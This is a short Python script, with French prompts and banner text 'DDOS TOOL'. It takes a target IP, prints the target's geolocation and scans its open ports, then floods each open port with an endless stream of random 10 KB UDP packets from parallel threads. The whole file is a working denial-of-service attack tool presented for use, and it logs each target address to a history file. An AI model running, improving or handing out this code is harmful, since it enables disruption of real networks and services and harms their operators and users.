import socket
import sys
import random
import ipv4
import pyfiglet
import concurrent.futures
from geocoder import ip as ip_socket


def main():
    pyfiglet.print_figlet("DDOS TOOL")

    print("-" * 60)
    ip = input("Entrez une adresse ip :")
    if not ipv4.exist(ip):
        print("[Erreur] L'adresse ip n'éxiste pas")
        sys.exit()
    if not socket.gethostbyname(ip) == ip:
        print(f"{ip}: {socket.gethostbyname(ip)}")
    print(f"City: {ip_socket(socket.gethostbyname(ip)).city}")
    print(f"Coordonate: {ip_socket(socket.gethostbyname(ip)).latlng}")
    print("-" * 60)

    def run(port, line):
        target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        target.connect((ip, port))
        nmb = 0
        while True:
            nmb += 1
            target.send(random._urandom(10 ** 4))
            space = "\n"*line
            print(f"{space}[{ip}:{port}] {nmb} packages send", end="\r")

    opened_port = ipv4.scan(ip)

    with open(f"historique.log", "a+") as file:
        file.write(f"{ip}: {opened_port}\n")

    for port in opened_port:
        print(f"[+]{ip}:{port}")

    if len(opened_port) != 0:
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(opened_port)) as executor:
            nmb = 0
            for port in opened_port:
                executor.submit(run, port, nmb)
                nmb += 1

if __name__ == "__main__":
    main()
